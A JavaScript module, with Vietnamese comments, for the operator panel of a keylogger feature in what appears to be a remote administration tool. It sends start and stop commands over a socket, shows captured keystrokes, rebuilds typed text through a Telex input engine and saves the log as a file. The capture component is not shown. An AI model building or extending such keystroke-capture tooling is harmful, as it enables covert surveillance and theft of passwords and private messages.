import { SocketService } from '../services/socket.js';
import { UIManager } from '../utils/ui.js';
import { TelexEngine } from '../utils/telex.js';

export const KeyloggerFeature = {
    init() {
        // 1. Lắng nghe log
        SocketService.on('LOG', (data) => {
            const text = data.payload || data;
            if (text.startsWith("[Keylogger]")) {
                this.processLogData(text.replace("[Keylogger] ", ""));
            }
        });

        // 2. Gán sự kiện nút bấm
        document.getElementById('btn-keylog-start')?.addEventListener('click', () => SocketService.send('START_KEYLOG'));
        document.getElementById('btn-keylog-stop')?.addEventListener('click', () => SocketService.send('STOP_KEYLOG'));
        document.getElementById('btn-keylog-clear')?.addEventListener('click', this.clearLogs);
        document.getElementById('btn-keylog-download')?.addEventListener('click', this.downloadLogFile);
    },

    processLogData(dataString) {
        // Format: RawKey|||TranslatedChar
        let rawKey = dataString;
        let translatedChar = "";

        if (dataString.includes("|||")) {
            const parts = dataString.split("|||");
            rawKey = parts[0];
            translatedChar = parts[1];
        }

        // A. Render Raw Key (An toàn)
        const rawContainer = document.getElementById("raw-key-output");
        if (rawContainer) {
            const span = document.createElement("span");
            span.className = "key-badge";
            span.textContent = rawKey; 
            
            // Thêm class màu mè
            if (["Enter", "Back", "Delete", "Escape"].includes(rawKey)) span.classList.add("special");
            if (rawKey.includes("Shift") || rawKey.includes("Control") || rawKey.includes("Alt")) span.classList.add("mod");
            
            rawContainer.appendChild(span);
            rawContainer.scrollTop = rawContainer.scrollHeight;
        }

        // B. Update Editor dùng Telex Engine
        if (translatedChar) {
            const editor = document.getElementById("keylogger-editor");
            if (editor) {
                const oldVal = editor.value;
                const newVal = TelexEngine.apply(oldVal, translatedChar);
                editor.value = newVal;
                editor.scrollTop = editor.scrollHeight;
            }
        }
    },

    clearLogs() {
        const raw = document.getElementById("raw-key-output");
        const editor = document.getElementById("keylogger-editor");
        if(raw) raw.innerHTML = "";
        if(editor) editor.value = "";
        UIManager.showToast("Đã xóa dữ liệu Keylogger", "success");
    },

    downloadLogFile() {
        const content = document.getElementById("keylogger-editor")?.value;
        if (!content) return UIManager.showToast("Chưa có nội dung!", "error");

        const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `Keylog_${Date.now()}.txt`;
        document.body.appendChild(a);
        a.click();
        
        setTimeout(() => {
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }, 100);
    }
};